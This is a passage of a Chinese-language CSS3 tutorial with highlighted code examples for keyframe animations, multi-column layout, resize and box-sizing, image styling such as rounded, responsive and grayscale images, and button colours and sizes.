yellow;&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>当在@keyframe创建动画，把它绑定到一个选择器，否则动画不会有任何效果。<br>指定至少两个CSS3的动画属性绑定向一个选择器：</p><blockquote><ol><li>规定动画的名称</li><li>规定动画的时长</li></ol></blockquote><p>使用实例：把 “myfirst” 动画捆绑到 div 元素，时长：5 秒</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">animation</span>: myfirst <span class="hljs-number">5s</span>;<br>-webkit-<span class="hljs-attribute">animation</span>: myfirst <span class="hljs-number">5s</span>; <span class="hljs-comment">/* Safari and Chrome */</span><br>&#125;  <br></code></pre></div></td></tr></table></figure><p>必须定义动画的名称和动画的持续时间。如果省略的持续时间，动画将无法运行，因为默认值是0。</p><p>使用实例1：当动画为 25% 及 50% 时改变背景色，然后当动画 100% 完成时再次改变</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> myfirst&#123;<br><span class="hljs-number">0%</span>   &#123;<span class="hljs-attribute">background</span>: red;&#125;<br><span class="hljs-number">25%</span>  &#123;<span class="hljs-attribute">background</span>: yellow;&#125;<br><span class="hljs-number">50%</span>  &#123;<span class="hljs-attribute">background</span>: blue;&#125;<br><span class="hljs-number">100%</span> &#123;<span class="hljs-attribute">background</span>: green;&#125;<br>&#125;<br><br>   <span class="hljs-keyword">@-webkit-keyframes</span> myfirst /* Safari <span class="hljs-keyword">and</span> Chrome */<br>&#123;<br><span class="hljs-number">0%</span>   &#123;<span class="hljs-attribute">background</span>: red;&#125;<br><span class="hljs-number">25%</span>  &#123;<span class="hljs-attribute">background</span>: yellow;&#125;<br><span class="hljs-number">50%</span>  &#123;<span class="hljs-attribute">background</span>: blue;&#125;<br><span class="hljs-number">100%</span> &#123;<span class="hljs-attribute">background</span>: green;&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><p>使用实例1：改变背景色和位置</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-keyword">@keyframes</span> myfirst&#123;<br><span class="hljs-number">0%</span>   &#123;<span class="hljs-attribute">background</span>: red; <span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;&#125;<br><span class="hljs-number">25%</span>  &#123;<span class="hljs-attribute">background</span>: yellow; <span class="hljs-attribute">left</span>:<span class="hljs-number">200px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;&#125;<br><span class="hljs-number">50%</span>  &#123;<span class="hljs-attribute">background</span>: blue; <span class="hljs-attribute">left</span>:<span class="hljs-number">200px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">200px</span>;&#125;<br><span class="hljs-number">75%</span>  &#123;<span class="hljs-attribute">background</span>: green; <span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">200px</span>;&#125;<br><span class="hljs-number">100%</span> &#123;<span class="hljs-attribute">background</span>: red; <span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;&#125;<br>&#125;<br><br>   <span class="hljs-keyword">@-webkit-keyframes</span> myfirst /* Safari <span class="hljs-keyword">and</span> Chrome */<br>&#123;<br><span class="hljs-number">0%</span>   &#123;<span class="hljs-attribute">background</span>: red; <span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;&#125;<br><span class="hljs-number">25%</span>  &#123;<span class="hljs-attribute">background</span>: yellow; <span class="hljs-attribute">left</span>:<span class="hljs-number">200px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;&#125;<br><span class="hljs-number">50%</span>  &#123;<span class="hljs-attribute">background</span>: blue; <span class="hljs-attribute">left</span>:<span class="hljs-number">200px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">200px</span>;&#125;<br><span class="hljs-number">75%</span>  &#123;<span class="hljs-attribute">background</span>: green; <span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">200px</span>;&#125;<br><span class="hljs-number">100%</span> &#123;<span class="hljs-attribute">background</span>: red; <span class="hljs-attribute">left</span>:<span class="hljs-number">0px</span>; <span class="hljs-attribute">top</span>:<span class="hljs-number">0px</span>;&#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="4-2-所有属性使用"><a href="#4-2-所有属性使用" class="headerlink" title="4.2 所有属性使用"></a>4.2 所有属性使用</h3><h4 id="4-2-1-实例1"><a href="#4-2-1-实例1" class="headerlink" title="4.2.1 实例1"></a>4.2.1 实例1</h4><p>实例1：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">animation-name</span>: myfirst;<br><span class="hljs-attribute">animation-duration</span>: <span class="hljs-number">5s</span>;<br><span class="hljs-attribute">animation-timing-function</span>: linear;<br><span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">2s</span>;<br><span class="hljs-attribute">animation-iteration-count</span>: infinite;<br><span class="hljs-attribute">animation-direction</span>: alternate;<br><span class="hljs-attribute">animation-play-state</span>: running;<br><span class="hljs-comment">/* Safari and Chrome: */</span><br>-webkit-<span class="hljs-attribute">animation-name</span>: myfirst;<br>-webkit-<span class="hljs-attribute">animation-duration</span>: <span class="hljs-number">5s</span>;<br>-webkit-<span class="hljs-attribute">animation-timing-function</span>: linear;<br>-webkit-<span class="hljs-attribute">animation-delay</span>: <span class="hljs-number">2s</span>;<br>-webkit-<span class="hljs-attribute">animation-iteration-count</span>: infinite;<br>-webkit-<span class="hljs-attribute">animation-direction</span>: alternate;<br>-webkit-<span class="hljs-attribute">animation-play-state</span>: running;<br>&#125;<br></code></pre></div></td></tr></table></figure><h4 id="4-2-2-实例2"><a href="#4-2-2-实例2" class="headerlink" title="4.2.2 实例2"></a>4.2.2 实例2</h4><p>与实例1动画相同，只是简写了动画 animation 属性。<br>实例2：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br><span class="hljs-attribute">animation</span>: myfirst <span class="hljs-number">5s</span> linear <span class="hljs-number">2s</span> infinite alternate;<br><span class="hljs-comment">/* Safari and Chrome: */</span><br>-webkit-<span class="hljs-attribute">animation</span>: myfirst <span class="hljs-number">5s</span> linear <span class="hljs-number">2s</span> infinite alternate;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="5-多列"><a href="#5-多列" class="headerlink" title="5.多列"></a>5.多列</h2><p>通过 CSS3，能够创建多个列来对文本进行布局 - 就像报纸那样。<br>所有 CSS3 的新多列属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">column-count</td><td align="center">指定元素应分为的列数</td><td align="center">3</td></tr><tr><td align="center">column-fill</td><td align="center">指定如何填充列</td><td align="center">3</td></tr><tr><td align="center">column-gap</td><td align="center">指定列之间差距</td><td align="center">3</td></tr><tr><td align="center">column-rule</td><td align="center">一个用于设置所有列规则的简写属性</td><td align="center">3</td></tr><tr><td align="center">column-rule-color</td><td align="center">指定的列之间颜色规则</td><td align="center">3</td></tr><tr><td align="center">column-rule-style</td><td align="center">指定的列之间的样式规则</td><td align="center">3</td></tr><tr><td align="center">column-rule-width</td><td align="center">指定的列之间的宽度规则</td><td align="center">3</td></tr><tr><td align="center">column-span</td><td align="center">指定一个元素应该横跨多少列</td><td align="center">3</td></tr><tr><td align="center">column-width</td><td align="center">指定列的宽度</td><td align="center">3</td></tr><tr><td align="center">columns</td><td align="center">缩写属性设置列宽和列数</td><td align="center">3</td></tr></tbody></table><h3 id="5-1-创建多列"><a href="#5-1-创建多列" class="headerlink" title="5.1 创建多列"></a>5.1 创建多列</h3><p>column-count属性指定元素的列数应分为什么。</p><p>使用实例：划分成三列的div元素的文本</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>-moz-<span class="hljs-attribute">column-count</span>:<span class="hljs-number">3</span>; <span class="hljs-comment">/* Firefox */</span><br>-webkit-<span class="hljs-attribute">column-count</span>:<span class="hljs-number">3</span>; <span class="hljs-comment">/* Safari and Chrome */</span><br><span class="hljs-attribute">column-count</span>:<span class="hljs-number">3</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-2-指定列之间的差距"><a href="#5-2-指定列之间的差距" class="headerlink" title="5.2 指定列之间的差距"></a>5.2 指定列之间的差距</h3><p>column-gap属性指定的列之间的差距。</p><p>使用实例：指定列之间40个像素差距</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>-moz-<span class="hljs-attribute">column-gap</span>:<span class="hljs-number">40px</span>; <span class="hljs-comment">/* Firefox */</span><br>-webkit-<span class="hljs-attribute">column-gap</span>:<span class="hljs-number">40px</span>; <span class="hljs-comment">/* Safari and Chrome */</span><br><span class="hljs-attribute">column-gap</span>:<span class="hljs-number">40px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="5-3-列规则"><a href="#5-3-列规则" class="headerlink" title="5.3 列规则"></a>5.3 列规则</h3><p>column-rule属性设置列之间的宽度，样式和颜色。</p><p>使用实例：指定列之间的宽度，样式和颜色的规则</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>-moz-<span class="hljs-attribute">column-rule</span>:<span class="hljs-number">3px</span> outset <span class="hljs-number">#ff00ff</span>; <span class="hljs-comment">/* Firefox */</span><br>-webkit-<span class="hljs-attribute">column-rule</span>:<span class="hljs-number">3px</span> outset <span class="hljs-number">#ff00ff</span>; <span class="hljs-comment">/* Safari and Chrome */</span><br><span class="hljs-attribute">column-rule</span>:<span class="hljs-number">3px</span> outset <span class="hljs-number">#ff00ff</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="6-用户界面"><a href="#6-用户界面" class="headerlink" title="6.用户界面"></a>6.用户界面</h2><p>在 CSS3 中, 增加了一些新的用户界面特性来调整元素尺寸，框尺寸和外边框。<br>用户界面属性：</p><table><thead><tr><th align="center">属性</th><th align="center">说明</th><th align="center">CSS</th></tr></thead><tbody><tr><td align="center">appearance</td><td align="center">允许您使一个元素的外观像一个标准的用户界面元素</td><td align="center">3</td></tr><tr><td align="center">box-sizing</td><td align="center">允许你以适应区域而用某种方式定义某些元素</td><td align="center">3</td></tr><tr><td align="center">icon</td><td align="center">Provides the author the ability to style an element with an iconic equivalent</td><td align="center">3</td></tr><tr><td align="center">nav-down</td><td align="center">指定在何处使用箭头向下导航键时进行导航</td><td align="center">3</td></tr><tr><td align="center">nav-index</td><td align="center">指定一个元素的Tab的顺序</td><td align="center">3</td></tr><tr><td align="center">nav-left</td><td align="center">指定在何处使用左侧的箭头导航键进行导航</td><td align="center">3</td></tr><tr><td align="center">nav-right</td><td align="center">指定在何处使用右侧的箭头导航键进行导航</td><td align="center">3</td></tr><tr><td align="center">nav-up</td><td align="center">指定在何处使用箭头向上导航键时进行导航</td><td align="center">3</td></tr><tr><td align="center">outline-offset</td><td align="center">外轮廓修饰并绘制超出边框的边缘</td><td align="center">3</td></tr><tr><td align="center">resize</td><td align="center">指定一个元素是否是由用户调整大小</td><td align="center">3</td></tr></tbody></table><h3 id="6-1-调整尺寸（Resizing）"><a href="#6-1-调整尺寸（Resizing）" class="headerlink" title="6.1 调整尺寸（Resizing）"></a>6.1 调整尺寸（Resizing）</h3><p>resize属性指定一个元素是否应该由用户去调整大小。</p><p>使用实例：由用户指定一个div元素尺寸大小</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">resize</span>:both;<br>    <span class="hljs-attribute">overflow</span>:auto;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="6-2-方框大小调整（Box-Sizing）"><a href="#6-2-方框大小调整（Box-Sizing）" class="headerlink" title="6.2 方框大小调整（Box Sizing）"></a>6.2 方框大小调整（Box Sizing）</h3><p>box-sizing 属性允许以确切的方式定义适应某个区域的具体内容。</p><p>使用实例：规定两个并排的带边框方框</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">box-sizing</span>:border-box;<br>    -moz-<span class="hljs-attribute">box-sizing</span>:border-box; <span class="hljs-comment">/* Firefox */</span><br>    <span class="hljs-attribute">width</span>:<span class="hljs-number">50%</span>;<br>    <span class="hljs-attribute">float</span><span class="hljs-selector-pseudo">:left</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="6-3-外形修饰（outline-offset-）"><a href="#6-3-外形修饰（outline-offset-）" class="headerlink" title="6.3 外形修饰（outline-offset ）"></a>6.3 外形修饰（outline-offset ）</h3><p>outline-offset 属性对轮廓进行偏移，并在超出边框边缘的位置绘制轮廓。<br>轮廓与边框有两点不同：1.轮廓不占用空间。2.轮廓可能是非矩形。</p><p>使用实例：规定边框边缘之外 15 像素处的轮廓</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span>&#123;<br>    <span class="hljs-attribute">border</span>:<span class="hljs-number">2px</span> solid black;<br>    <span class="hljs-attribute">outline</span>:<span class="hljs-number">2px</span> solid red;<br>    <span class="hljs-attribute">outline-offset</span>:<span class="hljs-number">15px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="7-图片"><a href="#7-图片" class="headerlink" title="7.图片"></a>7.图片</h2><p>使用 CSS 来布局图片。</p><h3 id="7-1-圆角图片"><a href="#7-1-圆角图片" class="headerlink" title="7.1 圆角图片"></a>7.1 圆角图片</h3><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">8px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-2-椭圆形图片"><a href="#7-2-椭圆形图片" class="headerlink" title="7.2 椭圆形图片"></a>7.2 椭圆形图片</h3><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">50%</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-3-缩略图（border）"><a href="#7-3-缩略图（border）" class="headerlink" title="7.3 缩略图（border）"></a>7.3 缩略图（border）</h3><p>使用 border 属性来创建缩略图。<br>实例1：</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<br>&#125;<br><br>&lt;img src=&quot;paris.jpg&quot; alt=&quot;Paris&quot;&gt;<br></code></pre></div></td></tr></table></figure><p>实例2：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">a</span> &#123;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">border</span>: <span class="hljs-number">1px</span> solid <span class="hljs-number">#ddd</span>;<br>    <span class="hljs-attribute">border-radius</span>: <span class="hljs-number">4px</span>;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">5px</span>;<br>    <span class="hljs-attribute">transition</span>: <span class="hljs-number">0.3s</span>;<br>&#125;<br><br><span class="hljs-selector-tag">a</span><span class="hljs-selector-pseudo">:hover</span> &#123;<br>    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">0</span> <span class="hljs-number">2px</span> <span class="hljs-number">1px</span> rgba<br>    (<span class="hljs-number">0</span>, <span class="hljs-number">140</span>, <span class="hljs-number">186</span>, <span class="hljs-number">0.5</span>);<br>&#125;<br><br>&lt;a href=&quot;paris.jpg&quot;&gt;<br>  &lt;img src=&quot;paris.jpg&quot; alt=&quot;Paris&quot;&gt;<br>&lt;/<span class="hljs-selector-tag">a</span>&gt;<br></code></pre></div></td></tr></table></figure><h3 id="7-4-响应式图片"><a href="#7-4-响应式图片" class="headerlink" title="7.4 响应式图片"></a>7.4 响应式图片</h3><p>响应式图片会自动适配各种尺寸的屏幕。</p><p>使用实例：需要自由缩放图片，且图片放大的尺寸不大于其原始的最大值</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>    <span class="hljs-attribute">max-width</span>: <span class="hljs-number">100%</span>;<br>    <span class="hljs-attribute">height</span>: auto;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-5-卡片式图片"><a href="#7-5-卡片式图片" class="headerlink" title="7.5 卡片式图片"></a>7.5 卡片式图片</h3><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.polaroid</span> &#123;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">80%</span>;<br>    <span class="hljs-attribute">background-color</span>: white;<br>    <span class="hljs-attribute">box-shadow</span>: <span class="hljs-number">0</span> <span class="hljs-number">4px</span> <span class="hljs-number">8px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.2</span>), <span class="hljs-number">0</span> <span class="hljs-number">6px</span> <span class="hljs-number">20px</span> <span class="hljs-number">0</span> <span class="hljs-built_in">rgba</span>(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0.19</span>);<br>&#125;<br><br><span class="hljs-selector-tag">img</span> &#123;<span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>&#125;<br><br><span class="hljs-selector-tag">div</span><span class="hljs-selector-class">.container</span> &#123;<br>    <span class="hljs-attribute">text-align</span>: center;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">10px</span> <span class="hljs-number">20px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-6-图片滤镜（filter）"><a href="#7-6-图片滤镜（filter）" class="headerlink" title="7.6 图片滤镜（filter）"></a>7.6 图片滤镜（filter）</h3><p>filter 属性用为元素添加可视效果 (例如：模糊与饱和度) 。</p><p>使用实例：修改所有图片的颜色为黑白 (100% 灰度)</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-tag">img</span> &#123;<br>    -webkit-<span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>); <span class="hljs-comment">/* Chrome, Safari, Opera */</span><br>    <span class="hljs-attribute">filter</span>: <span class="hljs-built_in">grayscale</span>(<span class="hljs-number">100%</span>);<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="7-7-响应式图片相册"><a href="#7-7-响应式图片相册" class="headerlink" title="7.7 响应式图片相册"></a>7.7 响应式图片相册</h3><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.responsive</span> &#123;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">0</span> <span class="hljs-number">6px</span>;<br>    <span class="hljs-attribute">float</span>: left;<br>    <span class="hljs-attribute">width</span>: <span class="hljs-number">24.99999%</span>;<br>&#125;<br><br><span class="hljs-keyword">@media</span> <span class="hljs-keyword">only</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">700px</span>)&#123;<br>    <span class="hljs-selector-class">.responsive</span> &#123;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">49.99999%</span>;<br>        <span class="hljs-attribute">margin</span>: <span class="hljs-number">6px</span> <span class="hljs-number">0</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">@media</span> <span class="hljs-keyword">only</span> screen <span class="hljs-keyword">and</span> (<span class="hljs-attribute">max-width</span>: <span class="hljs-number">500px</span>)&#123;<br>    <span class="hljs-selector-class">.responsive</span> &#123;<br>        <span class="hljs-attribute">width</span>: <span class="hljs-number">100%</span>;<br>    &#125;<br>&#125;<br></code></pre></div></td></tr></table></figure><h2 id="8-按钮"><a href="#8-按钮" class="headerlink" title="8.按钮"></a>8.按钮</h2><p>实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button</span> &#123;<br>    <span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>; <span class="hljs-comment">/* Green */</span><br>    <span class="hljs-attribute">border</span>: none;<br>    <span class="hljs-attribute">color</span>: white;<br>    <span class="hljs-attribute">padding</span>: <span class="hljs-number">15px</span> <span class="hljs-number">32px</span>;<br>    <span class="hljs-attribute">text-align</span>: center;<br>    <span class="hljs-attribute">text-decoration</span>: none;<br>    <span class="hljs-attribute">display</span>: inline-block;<br>    <span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;<br>&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-1-按钮颜色（background-color）"><a href="#8-1-按钮颜色（background-color）" class="headerlink" title="8.1 按钮颜色（background-color）"></a>8.1 按钮颜色（background-color）</h3><p>使用 background-color 属性来设置按钮颜色。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button1</span> &#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#4CAF50</span>;&#125; <span class="hljs-comment">/* Green */</span><br><span class="hljs-selector-class">.button2</span>&#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#008CBA</span>;&#125; <span class="hljs-comment">/* Blue */</span><br><span class="hljs-selector-class">.button3</span> &#123;<span class="hljs-attribute">background-color</span>:<span class="hljs-number">#f44336</span>;&#125; <span class="hljs-comment">/* Red */</span><br><span class="hljs-selector-class">.button4</span> &#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#e7e7e7</span>; <span class="hljs-attribute">color</span>: black;&#125; <span class="hljs-comment">/* Gray */</span><br><span class="hljs-selector-class">.button5</span>&#123;<span class="hljs-attribute">background-color</span>: <span class="hljs-number">#555555</span>;&#125; <span class="hljs-comment">/* Black */</span><br></code></pre></div></td></tr></table></figure><h3 id="8-2-按钮大小（font-size）"><a href="#8-2-按钮大小（font-size）" class="headerlink" title="8.2 按钮大小（font-size）"></a>8.2 按钮大小（font-size）</h3><p>使用 font-size 属性来设置按钮大小。</p><p>使用实例：</p><figure class="highlight css"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs css"><span class="hljs-selector-class">.button1</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">10px</span>;&#125;<br><span class="hljs-selector-class">.button2</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">12px</span>;&#125;<br><span class="hljs-selector-class">.button3</span>&#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">16px</span>;&#125;<br><span class="hljs-selector-class">.button4</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">20px</span>;&#125;<br><span class="hljs-selector-class">.button5</span> &#123;<span class="hljs-attribute">font-size</span>: <span class="hljs-number">24px</span>;&#125;<br></code></pre></div></td></tr></table></figure><h3 id="8-3-圆角按钮（border-radius）"><a href="#8-3-圆角按钮（border-radius）" class="headerlink" title="8.3 圆角按钮（border-radius）"></a>8.3 